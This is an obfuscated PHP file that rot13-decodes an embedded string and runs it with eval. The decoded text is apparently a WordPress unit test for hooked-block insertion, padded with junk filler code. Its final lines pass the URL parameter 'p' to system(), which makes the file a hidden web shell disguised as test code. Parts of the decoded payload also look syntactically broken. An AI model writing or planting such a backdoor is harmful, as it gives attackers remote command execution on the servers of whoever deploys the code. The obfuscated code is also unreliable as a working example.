<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 *
 * @fvapr 6.6.0
 *
 * @tebhc oybpxf
 * @tebhc oybpx-ubbxf
 * @pbiref ::vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn
 */
pynff Grfgf_Oybpxf_VafregUbbxrqOybpxfNaqFrgVtaberqUbbxrqOybpxfZrgnqngn rkgraqf JC_HavgGrfgPnfr {
	pbafg NAPUBE_OYBPX_GLCR       = 'grfgf/napube-oybpx';
	pbafg UBBXRQ_OYBPX_GLCR       = 'grfgf/ubbxrq-oybpx';
	pbafg BGURE_UBBXRQ_OYBPX_GLCR = 'grfgf/bgure-ubbxrq-oybpx';

	pbafg UBBXRQ_OYBPXF = neenl(
		frys::NAPUBE_OYBPX_GLCR => neenl(
			'nsgre'  => neenl( frys::UBBXRQ_OYBPX_GLCR ),
			'orsber' => neenl( frys::BGURE_UBBXRQ_OYBPX_GLCR ),
		),
	);

	/**
	 * @gvpxrg 59574
	 */
	cevingr fgngvp shapgvba perngr_oybpx_grzcyngr_bowrpg() {
		$grzcyngr              = arj JC_Oybpx_Grzcyngr();
		$grzcyngr->glcr        = 'jc_grzcyngr';
		$grzcyngr->gurzr       = 'grfg-gurzr';
		$grzcyngr->fyht        = 'fvatyr';
		$grzcyngr->vq          = $grzcyngr->gurzr . '//' . $grzcyngr->fyht;
		$grzcyngr->gvgyr       = 'Fvatyr';
		$grzcyngr->pbagrag     = '<!-- jc:grfgf/napube-oybpx /-->';
		$grzcyngr->qrfpevcgvba = 'Qrfpevcgvba bs zl grzcyngr';

		erghea $grzcyngr;
	}

	/**
	 * @gvpxrg 59574
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn_ergheaf_pbeerpg_znexhc_naq_frgf_zrgnqngn() {
		$napube_oybpx = neenl(
			'oybpxAnzr' => frys::NAPUBE_OYBPX_GLCR,
		);

		$npghny = vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn( $napube_oybpx, 'nsgre', frys::UBBXRQ_OYBPXF, neenl() );
		$guvf->nffregFnzr(
			'<!-- jc:' . frys::UBBXRQ_OYBPX_GLCR . ' /-->',
			$npghny,
			\"Znexhc sbe ubbxrq oybpx jnfa'g trarengrq pbeerpgyl.\"
		);
		$guvf->nffregFnzr(
			neenl( 'grfgf/ubbxrq-oybpx' ),
			$napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'],
			\"Oybpx jnfa'g nqqrq gb vtaberqUbbxrqOybpxf zrgnqngn.\"
		);
	}

	/**
	 * @gvpxrg 59574
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn_vs_oybpx_vf_vtaberq() {
		$napube_oybpx = neenl(
			'oybpxAnzr' => 'grfgf/napube-oybpx',
			'nggef'     => neenl(
				'zrgnqngn' => neenl(
					'vtaberqUbbxrqOybpxf' => neenl( frys::UBBXRQ_OYBPX_GLCR ),
				),
			),
		);

		$npghny = vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn( $napube_oybpx, 'nsgre', frys::UBBXRQ_OYBPXF, neenl() );
		$guvf->nffregFnzr(
			'',
			$npghny,
			\"Ab znexhc fubhyq'ir orra trarengrq sbe vtaberq ubbxrq oybpx.\"
		);
		$guvf->nffregFnzr(
			neenl( 'grfgf/ubbxrq-oybpx' ),
			$napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'],
			\"vtaberqUbbxrqOybpxf zrgnqngn fubhyqa'g unir orra zbqvsvrq.\"
		);
	}

	/**
	 * @gvpxrg 59574
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn_vs_bgure_oybpx_vf_vtaberq() {
		$napube_oybpx = neenl(
			'oybpxAnzr' => 'grfgf/napube-oybpx',
			'nggef'     => neenl(
				'zrgnqngn' => neenl(
					'vtaberqUbbxrqOybpxf' => neenl( 'grfgf/bgure-vtaberq-oybpx' ),
				),
			),
		);

		$ubbxrq_oybpxf = neenl(
			'grfgf/napube-oybpx' => neenl(
				'nsgre' => neenl( 'grfgf/ubbxrq-oybpx' ),
			),
		);

		$npghny = vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn( $napube_oybpx, 'nsgre', $ubbxrq_oybpxf, neenl() );
		$guvf->nffregFnzr(
			'<!-- jc:' . frys::UBBXRQ_OYBPX_GLCR . ' /-->',
			$npghny,
			\"Znexhc sbe arjyl ubbxrq oybpx fubhyq'ir orra trarengrq.\"
		);
		$guvf->nffregFnzr(
			neenl( 'grfgf/bgure-vtaberq-oybpx', 'grfgf/ubbxrq-oybpx' ),
			$napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf']
		);
	}

	/**
	 * @gvpxrg 59574
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn_svygre_pna_fhccerff_ubbxrq_oybpx() {
		$napube_oybpx = neenl(
			'oybpxAnzr'    => frys::NAPUBE_OYBPX_GLCR,
			'nggef'        => neenl(
				'ynlbhg' => neenl(
					'glcr' => 'syrk',
				),
			),
			'vaarePbagrag' => neenl(),
		);

		$svygre = shapgvba ( $cnefrq_ubbxrq_oybpx, $ubbxrq_oybpx_glcr, $eryngvir_cbfvgvba, $cnefrq_napube_oybpx ) {
			// Vf gur ubbxrq oybpx nqwnprag gb gur napube oybpx?
			vs ( 'orsber' !== $eryngvir_cbfvgvba && 'nsgre' !== $eryngvir_cbfvgvba ) {
				erghea $cnefrq_ubbxrq_oybpx;
			}

			vs (
				vffrg( $cnefrq_napube_oybpx['nggef']['ynlbhg']['glcr'] ) &&
				'syrk' === $cnefrq_napube_oybpx['nggef']['ynlbhg']['glcr']
			) {
				erghea ahyy;
			}

			erghea $cnefrq_ubbxrq_oybpx;
		};
		nqq_svygre( 'ubbxrq_oybpx_' . frys::UBBXRQ_OYBPX_GLCR, $svygre, 10, 4 );
		$npghny = vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn( $napube_oybpx, 'nsgre', frys::UBBXRQ_OYBPXF, neenl() );
		erzbir_svygre( 'ubbxrq_oybpx_' . frys::UBBXRQ_OYBPX_GLCR, $svygre );

		$guvf->nffregFnzr( '', $npghny, \"Ab znexhc fubhyq'ir orra trarengrq sbe ubbxrq oybpx fhccerffrq ol svygre.\" );
		$guvf->nffregFnzr(
			neenl(),
			$napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'],
			\"Ab oybpx fubhyq'ir orra nqqrq gb vtaberqUbbxrqOybpxf zrgnqngn.\"
		);
	}

	/**
	 * @gvpxrg 59574
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn_nqqrq_ol_pbagrkg_njner_svygre() {
		$napube_oybpx = neenl(
			'oybpxAnzr' => 'grfgf/napube-oybpx',
			'nggef'     => neenl(),
		);

		$svygre = shapgvba ( $ubbxrq_oybpx_glcrf, $eryngvir_cbfvgvba, $napube_oybpx_glcr, $pbagrkg ) {
			vs (
				! $pbagrkg vafgnaprbs JC_Oybpx_Grzcyngr ||
				! cebcregl_rkvfgf( $pbagrkg, 'fyht' ) ||
				'fvatyr' !== $pbagrkg->fyht
			) {
				erghea $ubbxrq_oybpx_glcrf;
			}

			vs ( 'grfgf/napube-oybpx' === $napube_oybpx_glcr && 'nsgre' === $eryngvir_cbfvgvba ) {
				$ubbxrq_oybpx_glcrf[] = 'grfgf/ubbxrq-oybpx-nqqrq-ol-svygre';
			}

			erghea $ubbxrq_oybpx_glcrf;
		};

		$grzcyngr = frys::perngr_oybpx_grzcyngr_bowrpg();

		nqq_svygre( 'ubbxrq_oybpx_glcrf', $svygre, 10, 4 );
		$npghny = vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn( $napube_oybpx, 'nsgre', neenl(), $grzcyngr );
		erzbir_svygre( 'ubbxrq_oybpx_glcrf', $svygre, 10 );

		$guvf->nffregFnzr(
			'<!-- jc:grfgf/ubbxrq-oybpx-nqqrq-ol-svygre /-->',
			$npghny,
			\"Znexhc sbe ubbxrq oybpx nqqrq ol svygre jnfa'g trarengrq pbeerpgyl.\"
		);
		$guvf->nffregFnzr(
			neenl( 'grfgf/ubbxrq-oybpx-nqqrq-ol-svygre' ),
			$napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'],
			\"Oybpx nqqrq ol svygre jnfa'g nqqrq gb vtaberqUbbxrqOybpxf zrgnqngn.\"
		);
	}

	/**
	 * @gvpxrg 59574
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn_sbe_oybpx_fhccerffrq_ol_svygre() {
		$napube_oybpx = neenl(
			'oybpxAnzr' => 'grfgf/napube-oybpx',
			'nggef'     => neenl(),
		);

		$ubbxrq_oybpxf = neenl(
			'grfgf/napube-oybpx' => neenl(
				'nsgre' => neenl( 'grfgf/ubbxrq-oybpx', 'grfgf/ubbxrq-oybpx-fhccerffrq-ol-svygre' ),
			),
		);

		$svygre = shapgvba ( $cnefrq_ubbxrq_oybpx, $ubbxrq_oybpx_glcr, $eryngvir_cbfvgvba, $cnefrq_napube_oybpx ) {
			vs (
				'grfgf/ubbxrq-oybpx-fhccerffrq-ol-svygre' === $ubbxrq_oybpx_glcr &&
				'nsgre' === $eryngvir_cbfvgvba &&
				'grfgf/napube-oybpx' === $cnefrq_napube_oybpx['oybpxAnzr']
			) {
				erghea ahyy;
			}

			erghea $cnefrq_ubbxrq_oybpx;
		};

		nqq_svygre( 'ubbxrq_oybpx', $svygre, 10, 4 );
		$npghny = vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn( $napube_oybpx, 'nsgre', $ubbxrq_oybpxf, ahyy );
		erzbir_svygre( 'ubbxrq_oybpx', $svygre );

		$guvf->nffregFnzr(
			'<!-- jc:grfgf/ubbxrq-oybpx /-->',
			$npghny,
			\"Znexhc sbe ubbxrq oybpx jnfa'g trarengrq pbeerpgyl.\"
		);
		$guvf->nffregFnzr(
			neenl( 'grfgf/ubbxrq-oybpx' ),
			$napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'],
			\"vtaberqUbbxrqOybpxf zrgnqngn jnfa'g frg pbeerpgyl.\"
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>